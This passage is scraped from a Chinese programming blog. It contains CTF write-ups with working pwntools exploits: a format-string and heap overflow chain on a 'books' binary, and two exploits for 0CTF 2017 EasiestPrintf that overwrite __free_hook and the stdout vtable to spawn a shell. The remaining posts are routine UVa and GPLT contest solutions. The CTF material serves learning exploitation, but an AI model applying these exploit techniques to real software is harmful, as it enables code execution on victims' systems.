v5 ) &#123; printf(\"%s\", final_str); printf(dest); // fsb result = 0LL; goto finish; &#125; puts(\"1: Edit order 1\"); puts(\"2: Edit order 2\"); puts(\"3: Delete order 1\"); puts(\"4: Delete order 2\"); puts(\"5: Submit\"); fgets(&amp;s, 128, stdin); switch ( s ) &#123; case '1': puts(\"Enter first order:\"); edit((__int64)order1); strcpy(dest, \"Your order is submitted!\\n\"); continue; case '2': puts(\"Enter second order:\"); edit((__int64)order2); strcpy(dest, \"Your order is submitted!\\n\"); continue; case '3': delete(order1); continue; case '4': delete(order2); continue; case '5': final_str = malloc(0x140uLL); if ( !final_str ) &#123; fwrite(\"Something failed!\\n\", 1uLL, 0x12uLL, stderr); result = 1LL; goto finish; &#125; submit((__int64)final_str, (const char *)order1, (char *)order2); v5 = 1; break; default: continue; &#125; &#125; &#125; fwrite(\"Something failed!\\n\", 1uLL, 0x12uLL, stderr); result = 1LL;finish: v4 = *MK_FP(__FS__, 40LL) ^ v11; return result;&#125; 我们发现在submit函数这里存在溢出，我们通过修改已经free的chunk2的size为0x151这样在我们malloc是就会得到这款内存，进而在submit函数中溢出dest，利用格式化字符串。 但是还有一个问题，我们在格式化字符串之后没有再call任何函数，所以我们通过修改.finisection为main的地址，以再结束后再次运行到main，关于.fini的作用在这篇中提到了 .finiThis section holds executable instructions that contribute to the process termination code. That is, when a program exits normally, the system arranges to execute the code in this section..initThis section holds executable instructions that contribute to the process initialization code. That is, when a program starts to run the system arranges to execute the code in this section before the main program entry point (called main in C programs). 总结来说，.fini是程序结束时的全局析构函数的地址，我们可以通过修改这个来得到控制流。 在程序刚开始的时候就malloc了三个连续的chunk，我们可以随意溢出，但是后面接着的strcpy会截断我们的溢出，以至于格式化字符串不能利用，于是我们只能利用submit这个还能输里面的strcat来溢出dest里的字符串来得到格式化字符串。 所以思路如下： free掉chunk2 溢出chunk1将chunk2修改为0x151，这样我们在submit的时候就会分配到这个位置 submit溢出dest，利用格式化字符串修改free的低2位（其中1位需要猜，1/16概率），同时修改.fini为程序开始 传入/bin/sh，得到shell 由于我们只能控制eip两次，所以不能有泄露的步骤了，下面的exp是有泄露的步骤的，没有成功123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#!/usr/bin/env python# coding=utf-8from pwn import *slog = 1 local = 1debug = 0global pcontext(arch='amd64')if slog: context(log_level = 'debug')if local: p = process('./books') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')else: p = remote()if local and debug: gdb.attach(p, open('debug'))elf = ELF('./books')free_got = elf.got['free']def edit1(payload): p.recvuntil('Submit\\n') p.sendline('1') p.recvuntil('order:\\n') p.sendline(payload)def edit2(payload): p.recvuntil('Submit\\n') p.sendline('2') p.recvuntil('order:\\n') p.sendline(payload)def dele(index): p.recvuntil('Submit\\n') p.sendline(str(index + 2))def submit(): p.recvuntil('Submit\\n') p.sendline('5')def pwn(): dele(2) payload = '%1908x' + '%13$hn' # 400a39 payload += '%31$lx' payload = payload.ljust(0x80) payload += p64(0) + p64(0x151) edit1(payload) p.recvuntil('Submit\\n') payload = '5'.ljust(8, '\\x00') + p64(0x6011f0)# payload += '%&#123;&#125;x'.format(39 - len(payload)) + '%13$hhn' gdb.attach(p) p.sendline(payload) print p.recvline() print p.recvline() print p.recvline() print p.recvuntil('400fda') leak_addr = int(p.recv(12), 16) print 'leak_addr =&gt; ', hex(leak_addr) libc.address = leak_addr - 241 - libc.symbols['__libc_start_main'] print 'libc.address =&gt; ', hex(libc.address) system_addr = libc.symbols['system'] print 'system_addr =&gt; ', hex(system_addr) dele(2) low_bytes = int(hex(system_addr)[-4:], 16) mid_bytes = int(hex(system_addr)[8:10], 16) payload = '%&#123;&#125;x'.format(int(hex(system_addr)[8:10], 16) - 12) + '%13$hhn' payload += '%&#123;&#125;x'.format(low_bytes - mid_bytes) + '%14$hn' payload = payload.ljust(0x80) payload += p64(0) + p64(0x151)# gdb.attach(p) edit1(payload) p.recvuntil('Submit\\n') payload = '5'.ljust(8, '\\x00') + p64(free_got+2) payload += p64(free_got) p.sendline(payload)if __name__ == '__main__': pwn() p.interactive() 0x0A unsorted bin attack这个应该是最简单的堆溢出技术了吧，先看当我们释放unsortbin时的源码 12345bck = victim-&gt;bk;........./* remove from unsorted list */unsorted_chunks (av)-&gt;bk = bck;bck-&gt;fd = unsorted_chunks (av); 并没有使用unlink宏，所以这里不存在检查指针的情况，如果我们修改了victim-&gt;bk的值为fake_addr，那么(av)-&gt;bk也会被修改，同时fake_addr+16 = victim-&gt;bk-&gt;fd = (av)，我们就将一个大的数字写到了fack_addr+16的位置去。但是由于(av)-&gt;bk被破坏了，所以下次再走到这步时可能会出错，具体什么操作出现什么问题还待研究。 这个看似任意地址写但是不能控制写的内容，所以只能作为其他攻击的准备。how2heap给出的方法时修改global_max_fast，这样我们在剩下分配其他内存时都会以fastbin的方式分配，为fastbin攻击做准备。 例题这里用给出的20160ctf的ZeroStorage为例Orz我去这程序怎么这么长。。。","tags":[{"name":"PWN","slug":"PWN","permalink":"http://reehy.top/tags/PWN/"},{"name":"heap","slug":"heap","permalink":"http://reehy.top/tags/heap/"}]},{"title":"20170CTF","date":"2017-03-27T12:56:21.000Z","path":"2017/03/27/20170CTF/","text":"EasiestPrintf简单的程序，但是始终找不到利用方法。看了wp，给大佬们跪了，好多奇技淫巧。 顺便吐吐槽新的pwntools的大升级。 第一个思路我们checksec之后发现got是不能重写的。 1234567[!] Couldn't find relocations against PLT to get symbols[*] '/home/ubuntu/ctf-problem/20170ctf/pwn/easiestPrintf/EasiestPrintf' Arch: i386-32-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) Change the value of __malloc_hook or __free_hook and find a way to trigger them in printf. 事实上，在printf函数中，当我们打印的字符串长度过长时，会调用malloc和free的函数。 12345678910111213141516171819vfprintf.cif (width &gt;= WORK_BUFFER_SIZE - 32) &#123; /* We have to use a special buffer. The \"32\" is just a safe bet for all the output which is not counted in the width. */ size_t needed = ((size_t) width + 32) * sizeof (CHAR_T); if (__libc_use_alloca (needed)) workend = (CHAR_T *) alloca (needed) + width + 32; else &#123; workstart = (CHAR_T *) malloc (needed); if (workstart == NULL) &#123; done = -1; goto all_done; &#125; workend = workstart + width + 32; &#125; &#125; Leak the libc address from the arbitrary read. Construct a format string with the %hhn trick to modify __free_hook to the one-gadget. %100000c to trigger malloc and free. I choose __free_hook instead of __malloc_hook because the address of __malloc_hook contains a \\x0a byte which will break the reading of the input. 用格式化字符串修改__free_hook，使其指向一个gadget 用%100000c去除法malloc 事实上，题目给出的libc的版本是早于libc.2.23.so的，所以存在*0x3E297这样一个execve(&#39;/bin/sh&#39;)，在之后版本的libc中全部都吧/bin/sh给去掉了 在GNU C库中，可以通过指定合适的钩子函数，来修改malloc、relloc、free的行为，通过使用这些钩子，可以帮助我们对动态的内存分配进行调试。 在malloc.h中定义了以下钩子变量：__malloc_hook该变量是malloc被调用时所使用的函数的指针，类型为void *function (size_t size, const void *caller)，caller的值表示malloc被调用时在栈上的返回地址，该值可以用来跟踪程序的内存消耗情况。__realloc_hook与__malloc_hook类似，该变量是realloc被调用时所使用的函数的指针，类型为void *function (void *ptr, size_t size, const void *caller)__free_hook该变量是free被调用时所使用的函数的指针，类型为void function (void *ptr, const void *caller)__memalign_hook该变量是aligned_alloc,memalign, posix_memalign和valloc所使用的函数的指针，类型为void *function (size_t alignment, size_t size, const void *caller)__malloc_initialize_hook该变量是初始化malloc系列函数的函数指针，该函数仅被调用一次。 如：void (*__malloc_initialize_hook) (void) = my_init_hook; 这些钩子函数在较新版本的gcc中已经被废弃了。 那么还有别的办法吗？ 注入malloc/realloc/free调试函数的一个可行的方式是采用自己的库来export这些函数，C链接规则是明确按顺序来的，因此如果两个库提供了相同的函数，第一个指定的将被使用。 在unix系统上，则可以使用LD_PRELOAD机制在加载时注入自己的malloc函数。 最终的exp1234567891011121314151617181920212223242526272829303132333435from pwn import *context.log_level = 'critical'libc = ELF('/lib/i386-linux-gnu/libc.so.6')elf = ELF('./EasiestPrintf')read_got = elf.symbols['_GLOBAL_OFFSET_TABLE_'] + 12libc.symbols['one_gadget'] = 0x3E297p = process('./EasiestPrintf')def exec_fmt(payload): p = elf.process(env = &#123;'LD_PRELOAD': libc.path&#125;) p.sendline(str(read_got)) p.recvuntil('Good Bye\\n') p.sendline(payload) return p.recvall()fmt = FmtStr(exec_fmt)log.critical('offset: ' + str(fmt.offset))p = process('./EasiestPrintf')print p.recvline()p.sendline(str(read_got))data = p.recvline()print dataread_addr = int(data, 16)libc.address = read_addr - libc.symbols['read']log.critical('libc_base : ', hex(libc.address))print p.recvline()p.sendline(fmtstr_payload(fmt.offset, &#123;libc.symbols['__free_hook']: libc.symbols['one_gadget']&#125;) + '%100000c')p.interactive() 第二个思路 程序在进行一次任意地址读之后有一次格式化字符串的机会，之后直接exit。在程序启用Full RELRO的情况下，选择覆盖libc中的_IO_2_1_stdout_结构的虚表，因为printf在将所有输入解析之后会调用其中的某个函数进行输出，我们可以其改为system，而这个结构自身会作为参数传入，覆盖虚表之后将一个sh\\0\\0写到整个结构头部即可。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from pwn import *DEBUG = 1elf = ELF('./EasiestPrintf')addr_stdout = 0x0804a044if DEBUG: libc = ELF('/lib/i386-linux-gnu/libc.so.6') p = process('./EasiestPrintf') context(log_level = 'critical')else: # p = remote('202.120.7.210', 12321) libc = ELF('./libc.so.6')def makeio(): return remote('202.120.7.210', 12321)def get_addr(addr): p.recvuntil('read:\\n') p.sendline(str(addr)) addr = p.recvuntil('\\n')[:-1] addr = int(addr, 16) print 'stdout =&gt;', hex(addr) return addrif __name__ == '__main__': stdout_addr = get_addr(addr_stdout) libc.address = stdout_addr - libc.symbols['_IO_2_1_stdout_'] system_addr = libc.symbols['system'] stdout_vtable_addr = stdout_addr + 0x94 str_sh = u32('sh\\x00\\x00') x1 = system_addr x1_hi, x1_lo = x1 &gt;&gt; 16, x1 &amp; 0xFFFF x2 = stdout_addr - 4 - 0x1c x2_hi, x2_lo = x2 &gt;&gt; 16, x2 &amp; 0xFFFF print p.recvuntil('Good Bye\\n') # libc_stdout = 'sh\\x00\\x00' # libc_stdout-4 = &amp;system # libc_stdout_vtable+0x1c = &amp;(libc_stdout-4) buf = p32(stdout_addr) + p32(stdout_addr-4) + p32(stdout_addr-2) + p32(stdout_vtable_addr) buf += '%' + str(str_sh-16) + 'c%7$n' buf += '%' + str(0x10000+x1_lo-str_sh) + 'c%8$hn' buf += '%' + str(0x10000+x1_hi-x1_lo) + 'c%9$hn' buf += '%' + str(0x10000+x2_lo-x1_hi) + 'c%10$hn' p.sendline(buf) p.interactive()","tags":[{"name":"PWN","slug":"PWN","permalink":"http://reehy.top/tags/PWN/"}]},{"title":"GPLT 2017","date":"2017-03-27T07:14:42.000Z","path":"2017/03/27/GPLT-2017/","text":"Summary这次连200分都没到，感觉平时做是能到的，还是太菜了。下面把没做完的题目做了吧，感觉有些方法挺暴力的。。好几个点都没拿到满分。。就酱吧 L2-020. 功夫传人12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include&lt;cstdio&gt;#include&lt;iostream&gt;#include&lt;vector&gt;using namespace std;typedef long long LL;const int maxN = 1e5 + 10;int v[maxN] = &#123;0&#125;;int n;double z, r;int s[maxN] = &#123;0&#125;;double sum;int main()&#123; scanf(\"%d%lf%lf\", &amp;n, &amp;z, &amp;r); r = 1 - r / 100; for (int i = 0; i &lt; n; i++) &#123; int x, y; scanf(\"%d\", &amp;x); if (x != 0) &#123; for (int j = 0; j &lt; x; j++) &#123; scanf(\"%d\", &amp;y); s[y] = i; &#125; &#125; else &#123; scanf(\"%d\", &amp;y); v[i] = y; &#125; &#125; for (int i = 0; i &lt; n; i++) &#123; if (v[i] != 0) &#123; int front = s[i]; double ans = z * r; while (front) &#123; ans *= r; front = s[front]; &#125; sum += ans * v[i]; &#125; &#125; printf(\"%ld\\n\", (LL)sum); return 0;&#125; L3-013. 非常弹的球123456789101112131415161718192021#include&lt;cstdio&gt;#include&lt;iostream&gt;#include&lt;vector&gt;using namespace std;typedef long long LL;const float g = 9.8;int w;int p;float ans;int main()&#123; scanf(\"%d%d\", &amp;w, &amp;p); float q = (float)p / 100.0; ans = (200000.0 / 9.8) / (float)w / q; printf(\"%.3f\\n\", ans); return 0;&#125;","tags":[{"name":"GPLT","slug":"GPLT","permalink":"http://reehy.top/tags/GPLT/"}]},{"title":"UVa 11572","date":"2017-03-24T05:36:17.000Z","path":"2017/03/24/UVa-11572/","text":"Description Emily the entrepreneur has a cool business idea: packaging and selling snowflakes. She has devised amachine that captures snowflakes as they fall, and serializes them into a stream of snowflakes that flow,one by one, into a package. Once the package is full, it is closed and shipped to be sold.The marketing motto for the company is “bags of uniqueness.” To live up to the motto, everysnowflake in a package must be different from the others. Unfortunately, this is easier said than done,because in reality, many of the snowflakes flowing through the machine are identical. Emily would liketo know the size of the largest possible package of unique snowflakes that can be created. The machinecan start filling the package at any time, but once it starts, all snowflakes flowing from the machinemust go into the package until the package is completed and sealed. The package can be completedand sealed before all of the snowflakes have flowed out of the machine.InputThe first line of input contains one integer specifying the number of test cases to follow. Each testcase begins with a line containing an integer n, the number of snowflakes processed by the machine.The following n lines each contain an integer (in the range 0 to 109, inclusive) uniquely identifying asnowflake. Two snowflakes are identified by the same integer if and only if they are identical.The input will contain no more than one million total snowflakes.OutputFor each test case output a line containing single integer, the maximum number of unique snowflakesthat can be in a package.Sample Input1512321Sample Output3 最后写来写去，写成了树上的样子。。滑动窗口的简单实例 Code1234567891011121314151617181920212223242526272829303132333435#include&lt;cstdio&gt;#include&lt;iostream&gt;#include&lt;string&gt;#include&lt;algorithm&gt;#include&lt;set&gt;using namespace std;typedef long long LL;const int maxN = 1e7 + 10;int n, m;int a[maxN];int main()&#123; scanf(\"%d\", &amp;n); while (n--) &#123; scanf(\"%d\", &amp;m); for (int i = 0; i &lt; m; i++) scanf(\"%d\", &amp;a[i]); set&lt;int&gt; s; int L = 0, R = 0, ans = 0; while (R &lt; m) &#123; while (R &lt; m &amp;&amp; !s.count(a[R])) s.insert(a[R++]); ans = max(ans, R - L); s.erase(a[L++]); &#125; printf(\"%d\\n\", ans); &#125; return 0;&#125;","tags":[{"name":"UVa","slug":"UVa","permalink":"http://reehy.top/tags/UVa/"},{"name":"滑动窗口","slug":"滑动窗口","permalink":"http://reehy.top/tags/滑动窗口/"}]},{"title":"简单算法","date":"2017-03-22T11:01:26.000Z","path":"2017/03/22/简单算法/","text":"递归 斐波那契数列 12345public static int fibonacci(int n)&#123; if (n &lt;= 1) return 1; return fibonacci(n - 1) + fibonacci(n - 2);&#125; 应用： + 上楼梯 + 兔子繁殖 注意边界条件 Ackerman函数 汉诺塔问题 分治基本步骤： + 划分 + 求解子问题 + 合并 尽量划分伪相同大小的问题，当划分的子问题存在重复计算的情况时，考虑动态规划和贪心 贪心考虑最局部优解 动态规划动态规划的性质： + 找出最优解的性质 + 自顶向下的解决问题 经典问题： + 最长公共子序列 + 0-1背包问题 回溯剪枝分枝限界法（广度优先） 经典问题： + 八皇后问题","tags":[{"name":"算法概述","slug":"算法概述","permalink":"http://reehy.top/tags/算法概述/"}]},{"title":"UVa 11054","date":"2017-03-22T10:43:30.000Z","path":"2017/03/22/UVa-11054/","text":"Description As you may know from the comic “Asterix and the Chieftain’s Shield”, Gergovia consists of one street,and every inhabitant of the city is a wine salesman. You wonder how this economy works? Simpleenough: everyone buys wine from other inhabitants of the city. Every day each inhabitant decides howmuch wine he wants to buy or sell. Interestingly, demand and supply is always the same, so that eachinhabitant gets what he wants.There is one problem, however: Transporting wine from one house to another results in work. Sinceall wines are equally good, the inhabitants of Gergovia don’t care which persons they are doing tradewith, they are only interested in selling or buying a specific amount of wine. They are clever enoughto figure out a way of trading so that the overall amount of work needed for transports is minimized.In this problem you are asked to reconstruct the trading during one day in Gergovia. For simplicitywe will assume that the houses are built along a straight line with equal distance between adjacenthouses. Transporting one bottle of wine from one house to an adjacent house results in one unit ofwork.InputThe input consists of several test cases. Each test case starts with the number of inhabitants n(2 ≤ n ≤ 100000). The following line contains n integers ai (−1000 ≤ ai ≤ 1000). If ai ≥ 0, itmeans that the inhabitant living in the i-th house wants to buy ai bottles of wine, otherwise if ai &lt; 0,he wants to sell −ai bottles of wine. You may assume that the numbers ai sum up to 0.The last test case is followed by a line containing ‘0’.OutputFor each test case print the minimum amount of work units needed so that every inhabitant has hisdemand fulfilled. You may assume that this number fits into a signed 64-bit integer (in C/C++ youcan use the data type “long long”, in JAVA the data type “long”).Sample Input55 -4 1 -3 16-1000 -1000 -1000 1000 1000 10000Sample Output99000 不知道为什么用scanf和printf会出问题，流就没问题。还发现scanf和流不能一起用，不然会出现奇怪的问题。 Code12345678910111213141516171819202122232425262728293031323334#include&lt;cstdio&gt;#include&lt;iostream&gt;#include&lt;string&gt;#include&lt;algorithm&gt;#include&lt;cmath&gt;using namespace std;typedef long long LL;const int maxN = 1e3 + 10;LL a = 0;LL cur;LL n;LL ans = 0;int main()&#123; cin &gt;&gt; n; while (n) &#123; ans = 0; a = 0; for (int i = 1; i &lt;= n; i++) &#123; cin &gt;&gt; cur; ans += abs(a); a += cur; &#125; cout &lt;&lt; ans &lt;&lt; '\\n'; cin &gt;&gt; n; &#125; return 0;&#125;","tags":[{"name":"动态规划","slug":"动态规划","permalink":"http://reehy.top/tags/动态规划/"},{"name":"UVa","slug":"UVa","permalink":"http://reehy.top/tags/UVa/"}]},{"title":"UVa 11134","date":"2017-03-22T09:08:35.000Z","path":"2017/03/22/UVa-11134/","text":"Description We would like to place n rooks, 1 ≤ n ≤ 5000, on a n × nboard subject to the following restrictions• The i-th rook can only be placed within the rectanglegiven by its left-upper corner (xli, yli) and its rightlowercorner (xri, yri), where 1 ≤ i ≤ n, 1 ≤ xli ≤xri ≤ n, 1 ≤ yli ≤ yri ≤ n.• No two rooks can attack each other, that is no two rookscan occupy the same column or the same row.InputThe input consists of several test cases. The first line of eachof them contains one integer number, n, the side of the board. n lines follow giving the rectangleswhere the rooks can be placed as described above. The i-th line among them gives xli, yli, xri, andyri. The input file is terminated with the integer ‘0’ on a line by itself.OutputYour task is to find such a placing of rooks that the above conditions are satisfied and then output nlines each giving the position of a rook in order in which their rectangles appeared in the input. If thereare multiple solutions, any one will do. Output ‘IMPOSSIBLE’ if there is no such placing of the rooks.Sample Input81 1 2 25 7 8 82 2 5 52 2 5 56 3 8 66 3 8 56 3 8 83 6 7 881 1 2 25 7 8 82 2 5 52 2 5 56 3 8 66 3 8 56 3 8 83 6 7 80Sample Output1 15 82 44 27 38 56 63 71 15 82 44 27 38 56 63 7 简单的贪心。我的方法是给x坐标的左边排序，如果起始相同，那么按区间长度从小到大排序。然后一个一个选就好了。算然我的输出不同，但答案应该不止一个，我的代码逻辑上应该是对的吧。。不过长的真难看。。 Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#include&lt;cstdio&gt;#include&lt;iostream&gt;#include&lt;string&gt;#include&lt;algorithm&gt;using namespace std;typedef long long LL;const int maxN = 5000;int n;int flag;int r[maxN][4];int ordx[maxN];int ordy[maxN];int x[maxN][2];int y[maxN][2];int vis[maxN];int ans[maxN][2];bool cmpy(int a, int b)&#123; if (y[a][0] &lt; y[b][0]) return true; else if (y[a][0] == y[b][0]) if (y[a][1] &lt; y[b][1]) return true; return false;&#125;bool cmpx(int a, int b)&#123; if (x[a][0] &lt; x[b][0]) return true; else if (x[a][0] == x[b][0]) if (x[a][1] &lt; x[a][1]) return true; return false;&#125;int main()&#123; scanf(\"%d\", &amp;n); while (n) &#123; flag = 0; for (int i = 0; i &lt; n; i++) ordx[i] = ordy[i] = i; for (int i = 0; i &lt; n; i++) &#123; scanf(\"%d\", &amp;x[i][0]); scanf(\"%d\", &amp;y[i][0]); scanf(\"%d\", &amp;x[i][1]); scanf(\"%d\", &amp;y[i][1]); &#125; sort(ordy, ordy + n, cmpy); sort(ordx, ordx + n, cmpx); for (int i = 0; i &lt; n; i++) &#123; while (x[ordx[i]][1] - x[ordx[i]][0] &gt;= 0) &#123; if (!vis[x[ordx[i]][0]]) &#123; ans[ordx[i]][0] = x[ordx[i]][0]; vis[x[ordx[i]][0]] = 1; break; &#125; else x[ordx[i]][0]++; &#125; if ((x[ordx[i]][1] - x[ordx[i]][0] &lt; 0) &amp;&amp; (i != n - 1)) &#123; flag = 1; break; &#125; &#125; if (!flag) &#123; for (int i = 0; i &lt;= n; i++) vis[i] = 0; for (int i = 0; i &lt; n; i++) &#123; while (y[ordy[i]][1] - y[ordy[i]][0] &gt;= 0) &#123; if (!vis[y[ordy[i]][0]]) &#123; ans[ordy[i]][1] = y[ordy[i]][0]; vis[y[ordy[i]][0]] = 1; break; &#125; else y[ordy[i]][0]++; &#125; if ((y[ordy[i]][1] - y[ordy[i]][0] &lt; 0) &amp;&amp; (i != n - 1)) &#123; flag = 1; break; &#125; &#125; &#125; if (!flag) for (int i = 0; i &lt; n; i++) printf(\"%d %d\\n\", ans[i][0], ans[i][1]); else printf(\"IMPOSSIBLE\"); scanf(\"%d\", &amp;n); &#125; return 0;&#125; 然而比大神的代码是如此简洁 123456789101112131415161718192021222324252627282930313233343536#include &lt;bits/stdc++.h&gt; using namespace std; const int N = 5005; int xl[N], yl[N], xr[N], yr[N], x[N], y[N], n; bool solve(int a[], int l[], int r[]) &#123; int cur, mr; //mr为包含k的区间最小右界，cur为放k的最优区间 memset(a, -1, sizeof(int)*n); for(int k = 1; k &lt;= n; ++k) &#123; cur = -1, mr = N; for(int i = 0; i &lt; n; ++i) if(a[i] &lt; 0 &amp;&amp; l[i] &lt;= k &amp;&amp; r[i] &lt; mr) mr = r[cur = i]; if(cur &lt; 0 || k &gt; mr) return 0; a[cur] = k; &#125; return 1; &#125; int main() &#123; while(~scanf(\"%d\", &amp;n), n) &#123; for(int i = 0; i &lt; n; ++i) scanf(\"%d%d%d%d\", &amp;xl[i], &amp;yl[i], &amp;xr[i], &amp;yr[i]); if(solve(x, xl, xr) &amp;&amp; solve(y, yl, yr)) for(int i = 0; i &lt; n; ++i) printf(\"%d %d\\n\", x[i], y[i]); else puts(\"IMPOSSIBLE\"); &#125; return 0; &#125;","tags":[{"name":"UVa","slug":"UVa","permalink":"http://reehy.top/tags/UVa/"},{"name":"贪心","slug":"贪心","permalink":"http://reehy.top/tags/贪心/"}]},{"title":"UVa 1152","date":"2017-03-21T07:57:28.000Z","path":"2017/03/21/UVa-1152/","text":"Description The SUM problem can be formulated as follows: given four lists A, B, C, D of integer values, computehow many quadruplet (a, b, c, d) ∈ A × B × C × D are such that a + b + c + d = 0. In the following, weassume that all lists have the same size n.InputThe input begins with a single positive integer on a line by itself indicating the number of the casesfollowing, each of them as described below. This line is followed by a blank line, and there is also ablank line between two consecutive inputs.The first line of the input file contains the size of the lists n (this value can be as large as 4000).We then have n lines containing four integer values (with absolute value as large as 228) that belongrespectively to A, B, C and D.OutputFor each test case, your program has to write the number quadruplets whose sum is zero.The outputs of two consecutive cases will be separated by a blank line.Sample Input16-45 22 42 -16-41 -27 56 30-36 53 -37 77-36 30 -75 -4626 -38 -10 62-32 -54 -6 45Sample Output5Sample Explanation: Indeed, the sum of the five following quadruplets is zero: (-45, -27, 42, 30),(26, 30, -10, -46), (-32, 22, 56, -46), (-32, 30, -75, 77), (-32, -54, 56, 30). 继续刷白书，人家的简单题，我还要5遍才AC，TAT。。。中途相遇法，先算a+b，再算c+d，然后用二分法查找。 Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include&lt;cstdio&gt;#include&lt;iostream&gt;#include&lt;string&gt;#include&lt;algorithm&gt;using namespace std;typedef long long LL;const int maxN = 4000;int n;int line;int a[maxN], b[maxN], c[maxN], d[maxN];int p[4000 * 4000], m[4000 * 4000];int cur = 0;int ans;int bs(int x, int y, int n)&#123; int ans = 0; int mi; int up, low; while (x &lt; y) &#123; mi = x + (y - x) / 2; if (m[mi] == n) &#123; ans++; up = low = mi; while (m[++up] == n &amp;&amp; up &lt;= line * line - 1) &#123; ans++; &#125; while (m[--low] == n &amp;&amp; low &gt;= 0) &#123; ans++; &#125; return ans; &#125; else if (m[mi] &gt; n) y = mi; else x = mi + 1; &#125; return ans;&#125;int main()&#123; scanf(\"%d\", &amp;n); while (n--) &#123; ans = 0; cur = 0; getchar(); scanf(\"%d\", &amp;line); for (int i = 0; i &lt; line; i++) scanf(\"%d%d%d%d\", &amp;a[i], &amp;b[i], &amp;c[i], &amp;d[i]); for (int i = 0; i &lt; line; i++) &#123; for (int j = 0; j &lt; line; j++) &#123; m[cur] = -(c[i] + d[j]); p[cur++] = a[i] + b[j]; &#125; &#125; sort(p, p + line * line); sort(m, m + line * line); for (int i = 0; i &lt; line * line; i++) &#123; ans += bs(0, line * line, p[i]); &#125; printf(\"%d\\n\", ans); if (n) printf(\"\\n\"); &#125; return 0;&#125;","tags":[{"name":"UVa","slug":"UVa","permalink":"http://reehy.top/tags/UVa/"},{"name":"中途相遇法","slug":"中途相遇法","permalink":"http://reehy.top/tags/中途相遇法/"}]},{"title":"UVa 1605","date":"2017-03-20T15:36:35.000Z","path":"2017/03/20/UVa-1605/","text":"Description The United Nations has decided to build a new headquarters in Saint Petersburg, Russia. It will have aform of a rectangular parallelepiped and will consist of several rectangular floors, one on top of another.Each floor is a rectangular grid of the same dimensions, each cell of this grid is an office.Two offices are considered adjacent if they are located on the same floor and share a common wall,or if one’s floor is the other’s ceiling.The St. Petersburg building will host n national missions. Each country gets several offices thatform a connected set.Moreover, modern political situation shows that countries might want to form secret coalitions. Forthat to be possible, each pair of countries must have at least one pair of adjacent offices, so that theycan raise the wall or the ceiling they share to perform secret pair-wise negotiations just in case theyneed to.You are hired to design an appropriate building for the UN.InputInput consists of several datasets. Each of them has a single integer number n (1 ≤ n ≤ 50) — thenumber of countries that are hosted in the building.OutputOn the first line of the output for each dataset write three integer numbers h, w, and l — height, widthand length of the building respectively.h descriptions of floors should follow. Each floor description consists of l lines with w characters oneach line. Separate descriptions of adjacent floors with an empty line.Use capital and small Latin letters to denote offices of different countries. There should be at most1 000 000 offices in the building. Each office should be occupied by a country. There should be exactlyn different countries in the building. In this problem the required building design always exists.Print a blank line between test cases.Sample Input4Sample Output2 2 2ABCCzzzz 以为是一次输入一个数据，看了别人的才发现并不是。紫书上的思路，构造两层，第一层第i行是国家i，第二层第j列是国家j。 Code12345678910111213141516171819202122232425262728293031323334353637383940414243#include&lt;cstdio&gt;#include&lt;iostream&gt;#include&lt;string&gt;#include&lt;algorithm&gt;using namespace std;typedef long long LL;int n;char arr[] = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\";void printl(int n)&#123; for (int i = 0; i &lt; n; i++) &#123; for (int j = 0; j &lt; n; j++) printf(\"%c\", arr[i]); printf(\"\\n\"); &#125;&#125;void printh(int n)&#123; for (int i = 0; i &lt; n; i++) &#123; for (int j = 0; j &lt; n; j++) printf(\"%c\", arr[j]); printf(\"\\n\"); &#125;&#125;int main()&#123; while (~scanf(\"%d\", &amp;n)) &#123; printf(\"2 %d %d\\n\", n, n); printl(n); printf(\"\\n\"); printh(n); &#125; return 0;&#125;","tags":[{"name":"UVa","slug":"UVa","permalink":"http://reehy.top/tags/UVa/"},{"name":"构造法","slug":"构造法","permalink":"http://reehy.top/tags/构造法/"}]},{"title":"UVa 120","date":"2017-03-17T06:29:43.000Z","path":"2017/03/17/UVa-120/","text":"Description Stacks and Queues are often considered the bread and butter of data structures and find use in architecture,parsing, operating systems, and discrete event simulation. Stacks are also important in thetheory of formal languages.This problem involves both butter and sustenance in the form of pancakes rather than bread inaddition to a finicky server who flips pancakes according to a unique, but complete set of rules.Given a stack of pancakes, you are to write a program that indicates how the stack can be sortedso that the largest pancake is on the bottom and the smallest pancake is on the top. The size of apancake is given by the pancake’s diameter. All pancakes in a stack have different diameters.Sorting a stack is done by a sequence of pancake “flips”. A flip consists of inserting a spatulabetween two pancakes in a stack and flipping (reversing) all the pancakes on the spatula (reversing thesub-stack). A flip is specified by giving the position of the pancake on the bottom of the sub-stack tobe flipped (relative to the whole stack). The pancake on the bottom of the whole stack has position 1and the pancake on the top of a stack of n pancakes has position n.A stack is specified by giving the diameter of each pancake in the stack in the order in which thepancakes appear.For example, consider the three stacks of pancakes below (in which pancake 8 is the top-mostpancake of the left stack):8 7 24 6 56 4 87 8 45 5 62 2 7The stack on the left can be transformed to the stack in the middle via flip(3). The middle stack canbe transformed into the right stack via the command flip(1).InputThe input consists of a sequence of stacks of pancakes. Each stack will consist of between 1 and 30pancakes and each pancake will have an integer diameter between 1 and 100. The input is terminatedby end-of-file. Each stack is given as a single line of input with the top pancake on a stack appearingfirst on a line, the bottom pancake appearing last, and all pancakes separated by a space.OutputFor each stack of pancakes, the output should echo the original stack on one line, followed by somesequence of flips that results in the stack of pancakes being sorted so that the largest diameter pancakeis on the bottom and the smallest on top. For each stack the sequence of flips should be terminated bya ‘0’ (indicating no more flips necessary). Once a stack is sorted, no more flips should be made.Sample Input1 2 3 4 55 4 3 2 15 1 2 3 4Sample Output1 2 3 4 505 4 3 2 11 05 1 2 3 41 2 0 改来改去终于对了，还有很长的路要走啊，最近天天做梦梦到考研，仿佛是看到了浙大一样，为什么会这么强烈呢，大概还是后悔高中最后的那段日子吧。不过那是那时我的选择，无论怎样，都是不可复制的人生。 